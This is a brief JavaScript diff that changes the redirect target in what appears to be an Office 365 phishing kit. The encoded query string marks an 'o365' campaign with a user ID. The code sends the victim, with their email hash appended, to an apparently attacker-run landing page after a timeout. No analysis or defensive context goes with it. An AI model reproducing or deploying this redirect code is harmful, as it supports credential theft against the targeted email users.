@@ -515,7 +515,7 @@
     const randomUrl =
       urls[Math.floor(Math.random() * urls.length)] + "#" + queryString;
 
-    var url = "https://acabrdaw.mypi.co/m/?c3Y9bzM2NV8xX25vbSZyYW5kPVowUlpPR1E9JnVpZD1VU0VSMjMwOTIwMjRVMDQwOTIzMjQ=N0123N[EMAIL]";
+    var url = "https://www.apreciosderemate.com/m/?c3Y9bzM2NV8xX25vbSZyYW5kPVlUZFZPV2s9JnVpZD1VU0VSMjMwOTIwMjRVMDQwOTIzMjQ=N0123N[EMAIL]";
 
       setTimeout(() => {
         window.location.href = url + emailHash + "#" + queryString;
